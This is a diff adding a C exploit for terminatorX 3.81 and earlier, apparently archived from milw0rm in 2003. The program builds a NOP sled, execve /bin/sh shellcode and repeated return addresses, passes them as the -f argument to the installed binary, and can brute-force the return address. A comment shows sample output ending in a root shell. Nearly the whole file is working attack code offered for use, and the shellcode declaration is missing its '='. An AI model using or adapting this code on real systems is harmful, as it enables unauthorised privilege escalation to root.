@@ -1,0 +1,239 @@
+/* TerminatorX V. <= 3.81 local root exploit by Li0n7
+ *
+ * Typical local stack-based overflow
+ *
+ * Bugs discovered by c0wboy from 0x333
+ *
+ * Contact Li0n7 voila fr
+ *
+ * Usage: ./terminatorX-exp [-r <RET>][-b [-s <STARTING_RET>]]
+ *
+ * -r <RET>: no bruteforcing, try to execute shellcode with <RET> as return address
+ * -b: enables bruteforcing
+ * -s: bruteforces by using return address from <STARTING_RET> to 0x00000000
+ *
+ * Example:
+ *
+ *root@li0n7:/tmp/test/exploits# ./terminatorX-exp -b
+ *
+ * exploit: terminatorX V. <= 3.81 local root exploit by Li0n7
+ * discoverer: c0wb0y (www.0x333.org)
+ * visit us: http://www.ioc.fr.st
+ * contact me: Li0n7[at]voila[dot]fr
+ * usage: ./xterminator2 [-r <RET>][-b [-s <STARTING_RET>]]
+ *
+ *[+] Starting bruteforcing...
+ *[+] Testing 0xbffff734...
+ *terminatorX Release 3.81 - Copyright (C) 1999-2003 by Alexander König 
+ *terminatorX comes with ABSOLUTELY NO WARRANTY - for details read the license. 
+ *... 
+ *[+] Testing 0xbffff66c... 
+ *terminatorX Release 3.81 - Copyright (C) 1999-2003 by Alexander König 
+ *terminatorX comes with ABSOLUTELY NO WARRANTY - for details read the license. 
+ *...
+ *tX: err: Error parsing terminatorXrc.
+ *tX: Failed loading terminatorXrc - trying to load old binary rc. 
+ *+ tX_warning: LADSPA_PATH not set. Trying /usr/lib/ladspa:/usr/local/lib/ladspa
+ ** tX_error: tX: Error: couldn't access directory "/usr/lib/ladspa". 
+ *+ tX_warning: Plugin "Sine Oscillator (Freq:audio, Amp:audio)" disabled. Not a 1-in/1-out plugin. 
+ *+ tX_warning: Plugin "Sine Oscillator (Freq:control, Amp:control)" disabled. Not a 1-in/1-out plugin. 
+ *+ tX_warning: Plugin "Stereo Amplifier" disabled. Not a 1-in/1-out plugin. 
+ *+ tX_warning: Plugin "White Noise Source" disabled. Not a 1-in/1-out plugin.
+ *warning: failed to load external entity "%90%90...%90%901%C0Ph//shh/bin%...%BFl%F6%FF%BF"
+ *
+ *(terminatorX:3085): WARNING **: Invalid UTF8 string passed to pango_layout_set_text() 
+ *sh-2.05b# exit *exit *[+] Exited: shell's ret code = 0 
+ *[+] Ret address found: 0xbffff66c
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+#include <errno.h>
+
+#define BSIZE 200
+#define D_START 0xbffff734
+#define PATH "/usr/local/bin/terminatorX"
+#define RET 0xbffff69e
+
+char shellcode[] "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"
+      "\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
+char *buffer,*ptr;
+
+void
+checkme(char *buffer)
+{
+      if(!buffer)
+      {
+          fprintf(stderr,"[-] Can't allocate memory,exiting...\n");
+          exit(0);
+      }
+      return;
+}
+
+
+void
+exec_vuln()
+{
+      execl(PATH,PATH,"-f",buffer,NULL);
+}
+
+
+int
+tease()
+{
+      pid_t pid;
+      pid_t wpid;
+      int status;
+
+      pid = fork();
+
+      if ( pid == -1 ) {
+          fprintf(stderr, " [-] %s: Failed to fork()\n", strerror(errno));
+          exit(13);
+
+      } else if ( pid == 0 ) {
+
+          exec_vuln();
+
+      } else {
+
+         wpid = wait(&status);
+         if ( wpid == -1 ) {
+
+             fprintf(stderr,"[-] %s: wait()\n", strerror(errno));
+             return 1;
+
+         } else if ( wpid != pid )
+
+             abort();
+
+        else {
+
+            if ( WIFEXITED(status) ) {
+
+                printf("[+] Exited: shell's ret code = %d\n", WEXITSTATUS(status));
+                return WEXITSTATUS(status);
+
+            } else if ( WIFSIGNALED(status) ) {
+
+                return WTERMSIG(status);
+            } else {
+
+                fprintf(stderr, "[-] Stopped.\n");
+
+            }
+        }
+      }
+      return 1;
+}
+
+
+int
+make_string(long ret_addr)
+{
+      int i;
+      long ret,addr,*addr_ptr;
+
+      buffer = (char *)malloc(512);
+      if(!buffer)
+      {
+          fprintf(stderr,"[-] Can't allocate memory, exiting...\n");
+          exit(-1);
+      }
+
+      ret = ret_addr;
+
+      ptr = buffer;
+
+      memset(ptr,0x90,BSIZE-strlen(shellcode));
+      ptr += BSIZE-strlen(shellcode);
+
+      for(i=0;i<strlen(shellcode);i++)
+          *ptr++ = shellcode[i];
+
+      addr_ptr = (long *)ptr;
+      for(i=0;i<20;i++)
+          *(addr_ptr++) = ret;
+      ptr = (char *)addr_ptr;
+      *ptr = 0;
+      return 0;
+}
+
+
+int
+bruteforce(long start)
+{
+      int ret;
+      long i;
+
+      fprintf(stdout,"[+] Starting bruteforcing...\n");
+
+      for(i=start;i<0;i=i-50)
+      {
+          fprintf(stdout,"[+] Testing 0x%x...\n",i);
+          make_string(i);
+          ret=tease();
+          if(ret==0)
+          {
+              fprintf(stdout,"[+] Ret address found: 0x%x\n",i);
+              break;
+          }
+      }
+
+      return 0;
+}
+
+void
+banner(char *argv0)
+{
+      fprintf(stderr,"\n exploit: terminatorX V. <= 3.81 local root exploit by Li0n7\n");
+      fprintf(stderr," discoverer: c0wb0y (www.0x333.org)\n");
+      fprintf(stderr," visit us: http://www.ioc.fr.st\n");
+      fprintf(stderr," contact me: Li0n7[at]voila[dot]fr\n");
+      fprintf(stderr," usage: %s [-r <RET>][-b [-s <STARTING_RET>]]\n\n",argv0);
+}
+
+int
+main(int argc,char *argv[])
+{
+      char * option_list = "br:s:";
+      int option,brute = 0, opterr = 0;
+      long ret,start = D_START;
+
+      banner(argv[0]);
+      if (argc < 1) exit(-1);
+
+      while((option = getopt(argc,argv,option_list)) != -1)
+          switch(option)
+          {
+              case 'b':
+                  brute = 1;
+                  break;
+              case 'r':
+                  ret = strtoul(optarg,NULL,0);
+                  make_string(ret);
+                  tease();
+                  exit(0);
+                  break;
+              case 's':
+                  start = strtoul(optarg,NULL,0);
+                  break;
+              case '?':
+                  fprintf(stderr,"[-] option \'%c\' invalid\n",optopt);
+                  banner(argv[0]);
+                  exit(-1);
+          }
+
+      if(brute)
+          bruteforce(start);
+
+      return 0;
+}
+
+
+// milw0rm.com [2003-11-13]
